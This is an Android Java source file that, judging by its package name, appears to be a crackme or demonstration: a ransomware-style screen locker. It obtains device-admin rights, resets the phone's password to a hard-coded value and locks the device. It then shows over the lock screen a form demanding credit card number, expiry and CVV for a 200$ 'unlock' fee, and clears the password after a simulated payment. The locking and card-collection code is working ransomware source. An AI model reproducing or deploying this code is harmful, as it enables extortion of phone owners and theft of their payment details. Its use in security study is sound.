package com.crackme_native.ofirmonis.passwordh;

import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.CountDownTimer;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {
    private ComponentName DeviceAdminComponent;
    private DevicePolicyManager devicePolicyManager;
    private EditText CreditCardNumber;
    private EditText Month;
    private EditText Year;
    private EditText CVV;
    private TextView AmountToPay;
    private Button PayAndUnlockButton;
    private ProgressBar progressBar;
    private String newPassword = "2511";
    private AlertDialog alertDialog;
    private AlertDialog finishAlertDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //show app over lock screen
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON|
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        setContentView(R.layout.activity_main);

        this.DeviceAdminComponent = new ComponentName(getApplicationContext(), MyAdminReceiver.class);
        this.devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        setAlertDialogs();
        connectXmlToCode();
        this.progressBar.setVisibility(View.GONE);
        this.PayAndUnlockButton.setOnClickListener(this);

        //check if app already have admin permissions
        if (this.devicePolicyManager.isAdminActive(this.DeviceAdminComponent)) {
            //Case true - change password
            changePassword(this.newPassword);
        }
        //Case not - request permissions from user
        else{
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,this.DeviceAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Request for permission");
            startActivityForResult(intent,1);
            changePassword(this.newPassword);

        }

    }
    public void setAlertDialogs(){
        this.alertDialog = new AlertDialog.Builder(this).create();
        this.alertDialog.setTitle("Alert !");
        this.alertDialog.setButton("Ok", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {

            }
        });
        this.finishAlertDialog = new AlertDialog.Builder(this).create();
        finishAlertDialog.setTitle("Done !");
        finishAlertDialog.setMessage("you released your device! the password was: "+newPassword);
        this.finishAlertDialog.setButton("Ok", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                finish();
            }
        });
    }
    public void changePassword(String newPassword){
        this.devicePolicyManager.setPasswordQuality(
                this.DeviceAdminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
        this.devicePolicyManager.setPasswordMinimumLength(this.DeviceAdminComponent, 0);
        this.devicePolicyManager.resetPassword(newPassword,
                DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        Log.d("is","password changed !");
        if(newPassword !=null) {
            this.devicePolicyManager.lockNow();
        }



    }
    public void connectXmlToCode(){
        this.CreditCardNumber = (EditText)findViewById(R.id.credit_card_field);
        this.Month = (EditText)findViewById(R.id.month_field);
        this.Year = (EditText)findViewById(R.id.year_field);
        this.CVV = (EditText)findViewById(R.id.cvv_field);
        this.PayAndUnlockButton = (Button)findViewById(R.id.PayAndUnlockDevice);
        this.AmountToPay = (TextView)findViewById(R.id.theAmount);
        this.AmountToPay.setText("200$");
        this.progressBar = (ProgressBar)findViewById(R.id.progressBar);
    }

    @Override
    public void onClick(View v) {
        if (v == this.PayAndUnlockButton){
            //Check for correct credit card details
            if (checkInputs()){
                //Case payment input is correct - show simulation of payment proccess
                this.progressBar.setVisibility(View.VISIBLE);
                CountDownTimer countDownTimer = new CountDownTimer(5000,1000) {
                    @Override
                    public void onTick(long millisUntilFinished) {

                    }

                    @Override
                    //On timer finishes - disable locking password and show message
                    public void onFinish() {
                        progressBar.setVisibility(View.GONE);
                        //Disable the password
                        changePassword(null);
                        finishAlertDialog.show();
                        Log.d("finish","you released your device! the password was: "+newPassword);

                    }
                }.start();
            }

        }
    }

    public boolean checkInputs(){
        Boolean creditCardOk=false,monthOk=false,yearOk=false,cvvOk=false;
        String creditCard = this.CreditCardNumber.getText().toString();
        String month = this.Month.getText().toString();
        String year = this.Year.getText().toString();
        String cvv = this.CVV.getText().toString();
        //Check the credit card input starts with 4580 (visa) and length 16
        if (!creditCard.matches("[0-9]+") || creditCard.length() != 16 || !creditCard.startsWith("4580")) {
            this.alertDialog.setMessage("wrong credit card format");
            this.alertDialog.show();
        }
        else
            creditCardOk = true;
        //Check for correct month input between 01-12
        if (!month.matches("[0-9]+") || month.length() != 2 || Integer.parseInt(month)< 1 || Integer.parseInt(month) > 12 ) {
            this.alertDialog.setMessage("wrong month format");
            this.alertDialog.show();
        }
        else
            monthOk = true;
        //Check for correct year input between 17-30 (2017-2030) and length of 2
        if (!year.matches("[0-9]+") || year.length() != 2 || Integer.parseInt(year)< 17 || Integer.parseInt(year) > 30 ) {
            this.alertDialog.setMessage("wrong year format");
            this.alertDialog.show();
        }
        else
            yearOk = true;
        //check for correct CVV input (3 numbers)
        if (!cvv.matches("[0-9]+") || cvv.length() != 3) {
            this.alertDialog.setMessage("wrong cvv format");
            this.alertDialog.show();
        }
        else
            cvvOk = true;
        if (creditCardOk && monthOk && yearOk && cvvOk){
            return true;
        }
        else
            return false;
    }
}
